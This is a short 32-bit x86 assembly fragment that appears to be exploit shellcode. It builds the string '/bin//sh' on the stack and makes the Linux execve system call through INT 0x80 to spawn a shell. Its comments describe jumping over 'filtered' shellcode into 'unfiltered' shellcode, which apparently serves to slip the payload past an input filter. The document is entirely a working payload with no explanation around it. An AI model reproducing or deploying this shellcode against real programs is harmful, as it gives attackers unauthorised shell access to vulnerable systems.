BITS 32

JMP short $+0x38	; Jump to the end of the filtered shellcode
XOR EAX, EAX		
PUSH EAX
PUSH ESP
POP ECX
MOV EDX, ECX
PUSH 0x68732f2f
PUSH 0x6e69622f
PUSH ESP
POP EBX
MOV EAX, 0x0b
INT 0x80
JMP short $+0x4d	; Jump into the unfiltered shellcode